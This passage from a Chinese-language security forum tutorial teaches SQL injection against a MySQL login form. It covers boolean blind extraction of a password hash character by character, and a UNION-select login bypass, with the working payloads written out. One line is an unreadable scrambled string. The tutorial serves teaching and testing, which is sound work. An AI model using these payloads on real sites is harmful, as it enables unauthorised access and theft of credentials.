## 2. 猜解注入获取密码

如果这时候我除了登录外，我还想获取用户密码，应该怎么办？

第一步：先构造出登录成功的语句

为了方便，使用发包方式

![](https://bbs.kanxue.com/upload/attach/201712/750361_qy5ndm7oz0ti3as.jpg)

输入的是`user'#`，这样就能注释后面语句，相当于`where user='admin'#`，为`true`登录成功

第二步：猜测密码字段

现在我们是不知道表中有什么字段，首先要获取密码字段。这里我们知道登录的时候肯定用的是用户表，所以这里不需要猜测用户表。

常见的密码字段有`pwd`,`pass`,`password`，以及与`form`表单中相同的字段。另外也可以使用字典爆破。

现在输入`admin' and pass!='' #`

![](https://bbs.kanxue.com/upload/attach/201712/750361_opzcn4pmkysxzhx.jpg)

假如`pass`不是密码字段，不存在这个字段的话，一般就会报错或者本来是登录成功的变成登录失败，因为密码一般不为空，所以字段存在就为`true`，而`user='admin'`也是`true`的，所以可以利用这个特性判断字段是否正确。

这里经过几次尝试，得出`pwd`是密码字段

![](https://bbs.kanxue.com/upload/attach/201712/750361_eie3bm7sxv37s6f.jpg)

第三步：获取密码长度

`Mysql`中有一个`length`函数，来获取当前字段的值的长度

![](https://bbs.kanxue.com/upload/attach/201712/750361_fhws15mwr3j0xen.jpg)

因为`where`是否为`true`取决于`pwd`字段，所以只要用二分法就能获取密码的长度，如上图`length(pwd)>20`是为`true`的，所以密码大于20位，

![](https://bbs.kanxue.com/upload/attach/201712/750361_cvn7mnux5ey3ao0.jpg)

失败，密码在21-40位之间

![](https://bbs.kanxue.com/upload/attach/201712/750361_rb3ggw7sktmm01q.jpg)

31-40位之间

![](https://bbs.kanxue.com/upload/attach/201712/750361_pqm82kb9xce5qkq.jpg)

以此类推，得到密码位32位

第四步：猜解密码

`Mysql`中`mid`函数`MID(字符串,位置,长度)`。`ASCII`函数获取一个字符的`ascii`值，常用的`acsii`的值有`'0'`为48，`'A'`为65，`'a'`为97。

因此输入`admin' and ascii(mid(pwd,1,1))>65 #`

![](https://bbs.kanxue.com/upload/attach/201712/750361_boxfjed66d6oerg.jpg)

发现第一位密码为数字

![](https://bbs.kanxue.com/upload/attach/201712/750361_bvhkss0rtms654u.jpg)

小于52

![](https://bbs.kanxue.com/upload/attach/201712/750361_cd7hm16plyxx6is.jpg)

大于48

![](https://bbs.kanxue.com/upload/attach/201712/750361_fy3qbgllnxxkxih.jpg)

不大于50

![](https://bbs.kanxue.com/upload/attach/201712/750361_fhkjc5fz1os2g57.jpg)

最终确定第一位密码的`ascii`值是50，对应的字符为`'2'`。

接下来31位也如此处理，`admin' and ascii(mid(pwd,2,1))>65 #`

最后得到结果是

```
21232f297a57a5a743894a0e4a801fc3
```

是`md5`加密，扔去解密

`3aeK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6h3y4E0k6o6g2Q4x3X3g2U0L8$3#2Q4x3V1j5`.

![](https://bbs.kanxue.com/upload/attach/201712/750361_nrhv7ebqprh0jp7.jpg)

## 3. UNION注入绕过无密码字段查询

![](https://bbs.kanxue.com/upload/attach/201712/750361_sic7kvgmqb0fgv1.jpg)

这个与（1）的区别就是密码验证不是判断是否有数据返回，而是通过用户查询的这条记录，然后判断传入的密码是否跟数据库中的相同。

当如果依旧输入`admin'#`

![](https://bbs.kanxue.com/upload/attach/201712/750361_ev0lb8xiufngw9x.jpg)

发现登陆失败，为什么呢？

因为虽然构造`sql`语句成功，也返回了结果

![](https://bbs.kanxue.com/upload/attach/201712/750361_wegxfrxdw61j440.jpg)

但是这里的判断还是没有通过，因为密码不正确。

那有什么方法呢？

如果能控制返回结果不就行了么。

第一步：判断表中有多少个字段

使用`order by`可以进行判断表中有多少个字段，`order by`除了可以按字段名排序外，也可以按字段的列数来排序。

![](https://bbs.kanxue.com/upload/attach/201712/750361_qvvm7razdmsdrop.jpg)

这里表示按第3列排序

但是如果这里写4

![](https://bbs.kanxue.com/upload/attach/201712/750361_u4txlo1dhcf0vos.jpg)

就报错了。

证明用户表有3个字段。

第二步：使用`UNION`查询

在`mysql`里`union`可以把两条语句查询的结果合并，但两个结果集字段的列数要相等

这里我们先清除语句1的结果，合并的结果就只能是语句2了

![](https://bbs.kanxue.com/upload/attach/201712/750361_rgvcq8f7tsv68rp.jpg)

`select null,null,null`

上面这条语句是最终结果，但是我不知道密码账号分别在第几个字段，所以这里可以将所有字段都填入密码

首先将随便一个字符串`md5`加密

`Md5('123')='202cb962ac59075b964b07152d234b70'`

最后输入

用户名`admin' and 0 union select '202cb962ac59075b964b07152d234b70','202cb962ac59075b964b07152d234b70','202cb962ac59075b964b07152d234b70'#`

密码`123`

![](https://bbs.kanxue.com/upload/attach/201712/750361_5bjumqif4s06jun.jpg)

为什么这样能登录成功？

当输入上面语句时，构造的语句为

```
select * from user where user='admin' and 0 union select '202cb962ac59075b964b07152d234b70','202cb962ac59075b964b07152d234b70','202cb962ac59075b964b07152d234b70'
```

![](https://bbs.kanxue.com/upload/attach/201712/750361_1gwxv4ub62zm043.jpg)

返回的结果是

```
select '202cb962ac59075b964b07152d234b70','202cb962ac59075b964b07152d234b70','202cb962ac59075b964b07152d234b70'
```

![](https://bbs.kanxue.com/upload/attach/201712/750361_9cbihadmwcuftvl.jpg)

但判断的时候

![](https://bbs.kanxue.com/upload/attach/201712/750361_ufnrdvo7tutt9jg.jpg)

输入的密码正好是`123`

![](https://bbs.kanxue.com/upload/attach/201712/750361_qnzdbehssp44oem.jpg)

的`md5`值正确，登录成功
